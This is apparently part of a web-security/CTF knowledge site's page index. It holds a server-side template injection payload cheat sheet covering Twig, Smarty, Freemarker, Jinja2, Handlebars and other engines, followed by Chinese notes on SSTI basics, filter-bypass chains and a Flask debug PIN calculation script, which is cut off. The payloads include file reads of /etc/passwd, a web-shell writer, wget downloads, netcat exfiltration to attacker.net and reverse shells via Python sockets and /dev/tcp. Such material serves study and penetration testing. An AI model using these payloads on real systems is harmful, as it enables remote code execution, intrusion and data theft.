java.lang.ProcessBuilder;x.command(\\\\\\\"wget\\\\\\\",\\\\\\\"http://x.x.x.x/1.sh\\\\\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\"))}\nTwig\nTwig - Basic injection\n{{7*7}}\n{{7*'7'}} would result in 49\n{{dump(app)}}\n{{app.request.server.all|join(',')}}\nTwig - Template format\n$output = $twig &gt; render (\n'Dear' . $_GET['custom_greeting'],\narray(\"first_name\" =&gt; $user.first_name)\n);\n$output = $twig &gt; render (\n\"Dear {first_name}\",\narray(\"first_name\" =&gt; $user.first_name)\n);\nTwig - Arbitrary File Reading\n\"{{'/etc/passwd'|file_excerpt(1,30)}}\"@\nTwig - Code execution\n{{self}}\n{{_self.env.setCache(\"ftp://attacker.net:2121\")}}{{_self.env.loadTemplate(\"backdoor\")}}\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n{{['id']|filter('system')}}\n{{['cat\\x20/etc/passwd']|filter('system')}}\n{{['cat$IFS/etc/passwd']|filter('system')}}\nExample with an email passing FILTER_VALIDATE_EMAIL PHP.\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\nemail=\"{{app.request.query.filter(0,0,1024,{'options':'system'})}}\"@attacker.tld\nSmarty\n{$smarty.version}\n{php}echo `id`;{/php}\n{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"&lt;?php passthru($_GET['cmd']); ?&gt;\",self::clearConfig())}\nFreemarker\nYou can try your payloads at https://try.freemarker.apache.org\nFreemarker - Basic injection\nThe template can be ${3*3} or the legacy #{3*3}\nFreemarker - Code execution\n&lt;#assign ex = \"freemarker.template.utility.Execute\"?new()&gt;${ ex(\"id\")}\n[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}\nFreemarker - Sandbox bypass\n\u26a0\ufe0f only works on Freemarker versions below 2.3.30\n&lt;#assign classloader=article.class.protectionDomain.classLoader&gt;\n&lt;#assign owc=classloader.loadClass(\"freemarker.template.ObjectWrapper\")&gt;\n&lt;#assign dwf=owc.getField(\"DEFAULT_WRAPPER\").get(null)&gt;\n&lt;#assign ec=classloader.loadClass(\"freemarker.template.utility.Execute\")&gt;\n${dwf.newInstance(ec,null)(\"id\")}\nPebble\nPebble - Basic injection\n{{ someString.toUPPERCASE() }}\nPebble - Code execution\nOld version of Pebble ( &lt; version 3.0.9): {{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}.\nNew version of Pebble :\n{% set cmd = 'id' %}\n{% set bytes = (1).TYPE\n.forName('java.lang.Runtime')\n.methods[6]\n.invoke(null,null)\n.exec(cmd)\n.inputStream\n.readAllBytes() %}\n{{ (1).TYPE\n.forName('java.lang.String')\n.constructors[0]\n.newInstance(([bytes]).toArray()) }}\nJade / Codepen\n- var x = root.process\n- x = x.mainModule.require\n- x = x('child_process')\n= x.exec('id | nc attacker.net 80')\n#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}\nVelocity\n#set($str=$class.inspect(\"java.lang.String\").type)\n#set($chr=$class.inspect(\"java.lang.Character\").type)\n#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"whoami\"))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end\nMako\n&lt;%\nimport os\nx=os.popen('id').read()\n%&gt;\n${x}\nJinja2\nOfficial website\nJinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.\nJinja2 - Basic injection\n{{4*4}}[[5*5]]\n{{7*'7'}} would result in 7777777\n{{config.items()}}\nJinja2 is used by Python Web Frameworks such as Django or Flask. The above injections have been tested on Flask application.\nJinja2 - Template format\n{% extends \"layout.html\" %}\n{% block body %}\n&lt;ul&gt;\n{% for user in users %}\n&lt;li&gt;&lt;a href=\"{{ user.url }}\"&gt;{{ user.username }}&lt;/a&gt;&lt;/li&gt;\n{% endfor %}\n&lt;/ul&gt;\n{% endblock %}\nJinja2 - Debug Statement\nIf the Debug Extension is enabled, a {% debug %} tag will be available to dump the current context as well as the available filters and tests. This is useful to see what\u2019s available to use in the template without setting up a debugger.\n&lt;pre&gt;{% debug %}&lt;/pre&gt;\nSource: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement\nJinja2 - Dump all used classes\n{{ [].class.base.subclasses() }}\n{{''.class.mro()[1].subclasses()}}\n{{ ''.__class__.__mro__[2].__subclasses__() }}\nJinja2 - Dump all config variables\n{% for key, value in config.iteritems() %}\n&lt;dt&gt;{{ key|e }}&lt;/dt&gt;\n&lt;dd&gt;{{ value|e }}&lt;/dd&gt;\n{% endfor %}\nJinja2 - Read remote file\n# ''.__class__.__mro__[2].__subclasses__()[40] = File class\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}\n{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](\"/tmp/flag\").read() }}\n# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398\n{{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }}\nJinja2 - Write into remote file\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}\nJinja2 - Remote Code Execution\nListen for connection\nnc -lnvp 8000\nExploit the SSTI by calling subprocess.Popen.\n\u26a0\ufe0f the number 396 will vary depending of the application.\n{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}\n{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\nExploit the SSTI by calling Popen without guessing the offset\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ip\\\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/cat\\\", \\\"flag.txt\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}\nSimply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113) In another GET parameter include a variable named \"input\" that contains the command you want to run (For example: &amp;input=ls)\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}\nExploit the SSTI by writing an evil config file.\n# evil config\n{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\\n\\nRUNCMD = check_output\\n') }}\n# load the evil config\n{{ config.from_pyfile('/tmp/evilconfig.cfg') }}\n# connect to evil host\n{{ config['RUNCMD']('/bin/bash -c \"/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1\"',shell=True) }}\nJinja2 - Filter bypass\nrequest.__class__\nrequest[\"__class__\"]\nBypassing _\nhttp://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&amp;class=class&amp;usc=_\n{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}\n{{request|attr([\"_\"*2,\"class\",\"_\"*2]|join)}}\n{{request|attr([\"__\",\"class\",\"__\"]|join)}}\n{{request|attr(\"__class__\")}}\n{{request.__class__}}\nBypassing [ and ]\nhttp://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&amp;class=class&amp;usc=_\nor\nhttp://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_\nBypassing |join\nhttp://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&amp;f=%s%sclass%s%s&amp;a=_\nBypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:\n{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}\nJinjava\nJinjava - Basic injection\n{{'a'.toUpperCase()}} would result in 'A'\n{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206\nJinjava is an open source project developed by Hubspot, available at https://github.com/HubSpot/jinjava/\nJinjava - Command execution\nFixed by https://github.com/HubSpot/jinjava/pull/230\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"new java.lang.String('xxx')\\\")}}\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"whoami\\\\\\\"); x.start()\\\")}}\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"netstat\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\n\n{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\\\"var x=new java.lang.ProcessBuilder; x.command(\\\\\\\"uname\\\\\\\",\\\\\\\"-a\\\\\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\")}}\nHandlebars\nHandlebars - Command Execution\n{{#with \"s\" as |string|}}\n{{#with \"e\"}}\n{{#with split as |conslist|}}\n{{this.pop}}\n{{this.push (lookup string.sub \"constructor\")}}\n{{this.pop}}\n{{#with string.split as |codelist|}}\n{{this.pop}}\n{{this.push \"return require('child_process').execSync('ls -la');\"}}\n{{this.pop}}\n{{#each conslist}}\n{{#with (string.sub.apply 0 codelist)}}\n{{this}}\n{{/with}}\n{{/each}}\n{{/with}}\n{{/with}}\n{{/with}}\n{{/with}}\nASP.NET Razor\nASP.NET Razor - Basic injection\n@(1+2)\nASP.NET Razor - Command execution\n@{\n// C# code\n}\nPlain Text\n</code></pre>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/","title":"SSTI","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_1","title":"\u5b9a\u4e49\u4ee5\u53ca\u7406\u89e3","text":"<p>\u6a21\u677f\u6ce8\u5165\u6d89\u53ca\u7684\u662f\u670d\u52a1\u7aefWeb\u5e94\u7528\u4f7f\u7528\u6a21\u677f\u5f15\u64ce\u6e32\u67d3\u7528\u6237\u8bf7\u6c42\u7684\u8fc7\u7a0b</p> <p>\u6a21\u7248\u5f15\u64ce\u4e00\u822c\u90fd\u9ed8\u8ba4\u5bf9\u6e32\u67d3\u7684\u53d8\u91cf\u503c\u8fdb\u884c\u7f16\u7801\u548c\u8f6c\u4e49\uff0c\u6240\u4ee5\u5e76\u4e0d\u4f1a\u9020\u6210\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u3002</p> <p>\u5982\u679c\u670d\u52a1\u7aef\u5c06\u7528\u6237\u7684\u8f93\u5165\u4f5c\u4e3a\u4e86\u6a21\u677f\u7684\u4e00\u90e8\u5206\uff0c\u90a3\u4e48\u5728\u9875\u9762\u6e32\u67d3\u65f6\u4e5f\u5fc5\u5b9a\u4f1a\u5c06\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9</p> <p>\u8fdb\u884c\u6a21\u7248\u7f16\u8bd1\u548c\u89e3\u6790\u6700\u540e\u8f93\u51fa\u3002</p> <p>\u6700\u5927\u7684\u4f18\u70b9\u5c31\u662f\u4f60\u53ef\u4ee5\u5728\u670d\u52a1\u5668\u7aef\u52a8\u6001\u751f\u6210HTML\u9875\u9762\uff0c\u770b\u8d77\u6765\u8ddf\u9759\u6001HTML\u9875\u9762\u4e00\u6837\u3002</p> <p>\u9996\u5148\u6211\u4eec\u5148\u8bb2\u89e3\u4e0b\u4ec0\u4e48\u662f\u6a21\u677f\u5f15\u64ce\uff0c\u4e3a\u4ec0\u4e48\u9700\u8981\u6a21\u677f\uff0c\u6a21\u677f\u5f15\u64ce\u53ef\u4ee5\u8ba9\uff08\u7f51\u7ad9\uff09\u7a0b\u5e8f\u5b9e\u73b0\u754c\u9762\u4e0e\u6570\u636e\u5206\u79bb\uff0c\u4e1a\u52a1\u4ee3\u7801\u4e0e\u903b\u8f91\u4ee3\u7801\u7684\u5206\u79bb\uff0c\u8fd9\u5927\u5927\u63d0\u5347\u4e86\u5f00\u53d1\u6548\u7387\uff0c\u826f\u597d\u7684\u8bbe\u8ba1\u4e5f\u4f7f\u5f97\u4ee3\u7801\u91cd\u7528\u53d8\u5f97\u66f4\u52a0\u5bb9\u6613\u3002\u4f46\u662f\u5f80\u5f80\u65b0\u7684\u5f00\u53d1\u90fd\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u5b89\u5168\u95ee\u9898\uff0c\u867d\u7136\u6a21\u677f\u5f15\u64ce\u4f1a\u63d0\u4f9b\u6c99\u7bb1\u673a\u5236\uff0c\u4f46\u540c\u6837\u5b58\u5728\u6c99\u7bb1\u9003\u9038\u6280\u672f\u6765\u7ed5\u8fc7\u3002</p> <p>\uff08\u5feb\u6377\u65b9\u4fbf------&gt;\u627f\u62c5\u98ce\u9669\uff09</p> <p>\u6240\u4ee5\u6f0f\u6d1e\u7684\u6765\u6e90\u8fd8\u662f\u90a3\u4e00\u4e2a\uff1a\u8fc7\u4e8e\u4fe1\u4efb\u7528\u6237\u6240\u8f93\u5165\u7684\u6570\u636e\u3002</p> <p></p> <p>\u796d\u51fa\u8fd9\u5f20\u7ecf\u5178\u7684\u56fe\uff0c\u7ecf\u5e38\u7528\u6765\u5224\u65ad\u6a21\u677f\u7c7b\u578b</p> <p>\u9700\u8981\u5173\u6ce8\u7684\u70b9\uff1a{{7*\u20187\u2019}}</p> <p>Jinja2\u8f93\u51fa\u4e3a49</p> <p>TWIG\u8f93\u51fa\u4e3a7777777</p> <p>\u90a3\u4e48\u5230\u5e95\u8fd9\u4e2a\u4e1c\u897f\u80fd\u5e72\u561b\u5462\uff1f</p> <p>\u5148\u7ed9\u51fa\u521d\u6b65\u5370\u8c61\uff08jinja2\uff09\uff1a</p> <p>\u7528\u6237\u8f93\u5165{{7+7}}</p> <p>\u7136\u540e\u670d\u52a1\u5668\u5e2e\u4f60\u8fd0\u884c{{}}\u4e2d\u7684\u4ee3\u7801\uff0c\u7b97\u51fa\u6765=49.</p> <p>\u5c31\u662f\u76f8\u5f53\u4e8e\u670d\u52a1\u5668\u5e2e\u4f60\u89e3\u6790\u8fd0\u884c\u4e86\u4f60\u8f93\u5165\u7684\u6570\u636e\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5982\u679c\u8f93\u5165\u7684\u662f\u6076\u610f\u7684\u4ee3\u7801........</p>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_2","title":"\u57fa\u7840\u8bed\u6cd5","text":"<p>\u89c9\u5f97\u5199\u7684\u592a\u5c11\u4e86\u60f3\u6dfb\u52a0\u6b22\u8fce\u3002</p> <pre><code>{% ... %} for Statements\n{{ ... }} for Expressions to print to the template output\n{# ... #} for Comments not included in the template output\n#  ... # for Line Statements\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u662f\u5b98\u65b9\u6587\u6863\u7684\u4ecb\u7ecd</p> <p>{%%}\u53ef\u4ee5\u7528\u6765\u58f0\u660e\u53d8\u91cf\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5faa\u73af\u8bed\u53e5\u548c\u6761\u4ef6\u8bed\u53e5\u3002</p> <p>{{}}\u7528\u4e8e\u5c06\u8868\u8fbe\u5f0f\u6253\u5370\u5230\u6a21\u677f\u8f93\u51fa</p> <p>{##}\u8868\u793a\u672a\u5305\u542b\u5728\u6a21\u677f\u8f93\u51fa\u4e2d\u7684\u6ce8\u91ca</p>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_3","title":"\u53ef\u4ee5\u6709\u548c{%%}\u76f8\u540c\u7684\u6548\u679c","text":"<pre><code>{% set x= 'abcd' %}  \u58f0\u660e\u53d8\u91cf\n{% for i in ['a','b','c'] %}{{i}}{%endfor%} \u5faa\u73af\u8bed\u53e5\n{% if 25==5*5 %}{{1}}{% endif %}  \u6761\u4ef6\u8bed\u53e5\nPlain Text\n</code></pre> <pre><code># for i in ['a','1']{{ i }}# endfor\n{% for i in ['a','1'] %}{{ item }}{% endfor %}\n\u8fd9\u4e24\u6761\u662f\u7b49\u6548\u7684\uff0c\u4f46\u662f\u6709\u4e2a\u524d\u63d0\uff0c\u5fc5\u987b\u5728environment\u4e2d\u914d\u7f6eline_statement_prefix\u5373app.jinja_env.line_statement_prefix=\"#\"\nPlain Text\n</code></pre> <p>You can use a dot (.) to access attributes of a variable in addition to the standard Python getitem \u201csubscript\u201d syntax ([]). --\u5b98\u65b9\u539f\u6587</p> <p>\u9664\u4e86\u6807\u51c6\u7684python\u8bed\u6cd5\u4f7f\u7528\u70b9<code>\uff08.\uff09</code>\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e2d\u62ec\u53f7<code>\uff08[]\uff09</code>\u6765\u8bbf\u95ee\u53d8\u91cf\u7684\u5c5e\u6027\u3002</p> <pre><code>{{\"\".__class__}}\n{{\"\"['__classs__']}}\nPlain Text\n</code></pre> <p>\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u7ed5\u8fc7\u3002</p> <p>\u6709\u4e9b\u9898\u76ee\u4f1a\u5199\u7684\u5f88\u957f\uff0c\u4e0d\u59a8\u62ff\u4e2a\u8fc7\u6765\u770b\u770b\uff0c\u5982\u679c\u80fd\u770b\u61c2\u90a3\u57fa\u7840\uff08\u751a\u81f3\u662f\u8fdb\u9636\uff09\u90e8\u5206\u5e94\u8be5\u5c31\u6ca1\u4ec0\u4e48\u95ee\u9898\u4e86\u3002</p> <pre><code>{% set id=dict(ind=a,ex=a)|join%}#\u5229\u7528join\u8fc7\u6ee4\u5668\u62fc\u63a5\u6210index\uff0c\u4e0b\u9762\u51e0\u4e2a\u7c7b\u4f3c\n{% set pp=dict(po=a,p=a)|join%}\n{% set ls=dict(ls=a)|join%}\n{% set ppe=dict(po=a,pen=a)|join%}\n{% set gt=dict(ge=a,t=a)|join%}\n{% set cr=dict(ch=a,r=a)|join%}\n{% set nn=dict(n=a)|join%}\n{% set tt=dict(t=a)|join%}\n{% set ff=dict(f=a)|join%}\n{% set ooqq=dict(o=a,s=a)|join %}\n{% set rd=dict(re=a,ad=a)|join%}\n{% set five=(lipsum|string|list)|attr(id)(tt) %}#\u8fd9\u91cc\u7528lipsum\u8fc7\u6ee4\u5668\u6700\u7ec8\u80fd\u591f\u53d6\u5f97\u6570\u5b575{\u5177\u4f53\u6d41\u7a0b\uff1a\u751f\u6210\u968f\u673a\u6570\u5b57-&gt;\u5b57\u7b26\u4e32\u5217\u8868\u8f93\u51fa-&gt;index(\"f\")\u627e\u5b57\u7b26'f'\u5728\u751f\u6210\u7684\u5217\u8868\u4e2d\u7684\u7b2c\u4e00\u6b21\u51fa\u73b0\u7684\u4f4d\u7f6e..}\uff08lorem\u00a0is not just a normal snippet\u2014it\u2019s actually a\u00a0generator. Every time you expand it, it will generate a 30-words dummy text, splitted into a few sentences.\uff09\n{% set three=(lipsum|string|list)|attr(id)(nn) %}\n{% set one=(lipsum|string|list)|attr(id)(ff) %}\n{% set shiba=five*five-three-three-one %}\n{% set xiahuaxian=(lipsum|string|list)|attr(pp)(shiba) %}#\uff08\u8fd9\u4e2a\u662f\u4e0b\u5212\u7ebf\uff0c\u7528pop\u53d6\uff0c\u548c\u4e0a\u9762\u7c7b\u4f3c\uff09\n{% set gb=(xiahuaxian,xiahuaxian,dict(glob=a,als=a)|join,xiahuaxian,xiahuaxian)|join %}\n{% set bin=(xiahuaxian,xiahuaxian,dict(builtins=a)|join,xiahuaxian,xiahuaxian)|join %}\n{% set chcr=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %}\n{% set xiegang=chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%}\n{% set space=chcr(three*three*five-five-five-three) %}\n{% set shell=(ls,space,xiegang,dict(var=a)|join,xiegang,dict(www=a)|join,xiegang,dict(flask=a)|join)|join %}\n{{(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()}}\n</code></pre> <p>\u4e0d\u505a\u8fc7\u591a\u89e3\u91ca\uff0c\u4e4b\u540e\u4f60\u8fd8\u4f1a\u770b\u5230\u4ed6\u7684\u3002</p>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#_4","title":"\u4f7f\u7528\u5de5\u5177","text":"<p>tplmap:ssti\u626b\u63cf\u5de5\u5177\uff0c\u5728\u521d\u671f\u4f1a\u5e26\u7ed9\u4f60\u7f8e\u5999\u7684\u4f53\u9a8c</p> <pre><code>git clone https://github.com/epinna/tplmap\n</code></pre> <p>\u81f3\u4e8e\u7528\u6cd5-h\u81ea\u5df1\u6162\u6162\u6478\u7d22\u3002</p>"},{"location":"web/ssti/%E6%A8%A1%E6%9D%BF%E7%9A%84%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/#django","title":"Django\u62a5\u9519","text":"<p>\u4e0d\u662fssti</p> <p>\u4f46\u662f\u662f\u6a21\u677f\u6240\u4ee5\u653e\u8fd9\u4e86\uff0c\u539f\u7406\u662f\u6ea2\u51fa</p> <p>%80\u540e\u7684\u5b57\u7b26\u7ed3\u5408\u62a5\u9519\u4fe1\u606fUnicodeEncodeError\u53ef\u4ee5\u63a8\u65ad\u662f\u7531\u4e8eascii\u7f16\u7801\u4e0d\u652f\u6301\u5bfc\u81f4\u7684\u62a5\u9519</p> <p>\u7f51\u7ad9\u662f\u4f7f\u7528Django\u8fdb\u884c\u5f00\u53d1\u7684,\u7ed3\u5408PHP\u53ef\u4ee5\u901a\u8fc7\u5728\u53c2\u6570\u4e2d\u6ce8\u5165@\u6765\u8bfb\u53d6\u6587\u4ef6\u7684\u6f0f\u6d1e,\u4f9d\u6b21\u67e5\u770bpython\u7684\u914d\u7f6e\u6587\u4ef6\u548c\u6570\u636e\u5e93\u5f97\u5230flag\u7684\u5185\u5bb9</p> <p>\uff08\u8fd9\u4e2a\u6211\u81ea\u5df1\u603b\u7ed3\u56fe\u7247\u88ab\u541e\u6389\u4e86\uff0c\u5148\u653e\u7740\uff09</p>"},{"location":"web/ssti/flask/flask_pin/","title":"pin\u7801\u7834\u89e3","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u8fd9\u91cc\u7684pin\u7801\u53ef\u4ee5\u7406\u89e3\u6210\u67d0\u4e00\u79cd\u8ba4\u8bc1\u7801\u3002</p> <p>\u8f93\u5165\u5931\u8d25\u8d85\u8fc710\u6b21\u5c31\u4f1a\u81ea\u52a8\u9501\u5b9a\uff0c\u6240\u4ee5\u4e0d\u80fd\u8c6a\u593a\uff0c\u53ea\u80fd\u667a\u53d6\u3002</p> <p>\u5371\u5bb3\uff1a</p> <p>1.\u4f1a\u6cc4\u9732\u5f53\u524d\u62a5\u9519\u9875\u9762\u7684\u6e90\u7801\uff0c\u53ef\u4f9b\u5ba1\u8ba1\u6316\u6398\u5176\u4ed6\u6f0f\u6d1e</p> <p>2.\u4f1a\u6cc4\u9732Web\u5e94\u7528\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u53caPython\u89e3\u91ca\u5668\u7684\u8def\u5f84</p> <p>3.debug\u9875\u9762\u4e2d\u5305\u542bPython\u7684\u4ea4\u4e92\u5f0fshell\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610fPython\u4ee3\u7801</p> <p>\u8fd9\u524d\u4e24\u6761\u4e00\u822c\u90fd\u662f\u4e0e\u4ee3\u7801\u5ba1\u8ba1\u76f8\u5173\uff0c\u53ef\u4ee5\u8bb2\u96be\u70b9\u80af\u5b9a\u4e0d\u5728\u8fd9\uff0c\u7136\u540e\u6700\u540e\u4e00\u6761\u5c31\u662f\u8fd9\u91cc\u6240\u8bb2\u7684pin\u7801\u66b4\u529b\u7834\u89e3</p> <p>\u78b0\u5230\u8fd9\u4e2a\u6f0f\u6d1e\u7684\u8981\u6c42\u662fflask\u6a21\u677f\u5b83\u5f00\u542fdebug\u6a21\u5f0f\uff08\u4fe1\u606f\u6cc4\u9732\u5df2\u7ecf\u662f\u975e\u5e38\u5371\u9669\u4e86\uff09</p> <p>\u8fd9\u4e2adebug\u9875\u9762\u5927\u6982\u662f\u957f\u8fd9\u4e2a\u6837\u5b50\uff1a</p> <p></p> <p></p> <p>\u4e0d\u4ec5\u80fd\u770b\u62a5\u9519\u6e90\u7801\uff0c\u5728\u65c1\u8fb9\u6709\u4e2a\u9ed1\u8272\u7684\u5c0f\u6846\u5b50\u70b9\u5f00\u4e4b\u540e\u5c31\u662f\u8fd9\u4e2apin\u7801\u7684\u754c\u9762\uff0c\u7834\u89e3\u51fa\u8fd9\u4e2apin\u7801\uff0c\u5c31\u5982\u540c\u4e4b\u524d\u7b2c\u4e09\u6761\u6240\u8ff0\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\uff0c\u5371\u9669\u7a0b\u5ea6\u975e\u5e38\u7684\u9ad8\u3002</p> <p>pin\u7801\u7684\u751f\u6210\u673a\u5236\u611f\u5174\u8da3\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u53bb\u7f51\u4e0a\u67e5\u627e\u8d44\u6599\uff0c\u8fd9\u91cc\u4e0d\u505a\u53d9\u8ff0</p> <p>\u800cpin\u7801\u751f\u6210\u4f9d\u8d56\u76846\u4e2a\u5143\u7d20\u6211\u4eec\u662f\u77e5\u9053\u7684\uff1a</p> <p>1.\u670d\u52a1\u5668\u8fd0\u884cflask\u6240\u767b\u5f55\u7684\u7528\u6237\u540d\uff08\u67e5\u770b/etc/passwd\u6216\u8005\u731c\uff0c\u4e00\u822c\u4e3aroot\u6216\u8005\u662fflaskweb\uff09</p> <p>2.modname\u3002\u4e00\u822c\u4e0d\u53d8\u5c31\u662fflask.app</p> <p>3.getattr(app, \u201cname\u201d, app.class.name)\u3002python\u8be5\u503c\u4e00\u822c\u4e3aFlask \uff0c\u503c\u4e00\u822c\u4e0d\u53d8</p> <p>4.flask\u5e93\u4e0bapp.py\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u62a5\u9519\u4fe1\u606f\u4f1a\u6cc4\u9732\u8be5\u503c\u3002\uff08\u6709\u70b9\u8003\u773c\u529b\uff09</p> <p>5.\u5f53\u524d\u7f51\u7edc\u7684mac\u5730\u5740\u7684\u5341\u8fdb\u5236\u6570\u3002\u901a\u8fc7\u6587\u4ef6/sys/class/net/eth0/address \u83b7\u53d6(eth0\u4e3a\u7f51\u5361\u540d)</p> <p>6.\u673a\u5668\u7684id\uff1a\u5bf9\u4e8e\u975edocker\u673a\u6bcf\u4e00\u4e2a\u673a\u5668\u90fd\u4f1a\u6709\u81ea\u5df2\u552f\u4e00\u7684id</p> <p>Linux\uff1a/etc/machine-id\u6216/proc/sys/kernel/random/boot_i\uff0c\u6709\u7684\u7cfb\u7edf\u6ca1\u6709\u8fd9\u4e24\u4e2a\u6587\u4ef6</p> <p>docker\uff1a/proc/self/cgroup</p> <p>\u4e4b\u540e\u5c31\u53ef\u4ee5\u5f00\u59cb\u7206\u7834pin\u7801\u4e86\uff1a</p> <p>\u4f7f\u7528\u811a\u672c\uff1a\uff08\u5ad6\u7684\uff09</p> <pre><code>import hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    'flaskweb'# username\n    'flask.app',# modname\n    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))\n    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),\n]\nprivate_bits = [\n    '2485410388611',# str(uuid.getnode()),  /sys/class/net/ens33/address\n    '310e09efcc43ceb10e426a0ffc99add5c651575fe93627e6019400d4520272ed'# get_machine_id(), /etc/machine-id\n]\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode('utf-8')\n    h.update(bit)\nh.update(b'cookiesalt')\ncookie_name = '__wzd' + h.hexdigest()[:20]\nnum = None\nif num is None:\n    h.update(b'pinsalt')\n    num = ('%09d' % int(h.hexdigest(), 16))[:9]\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = 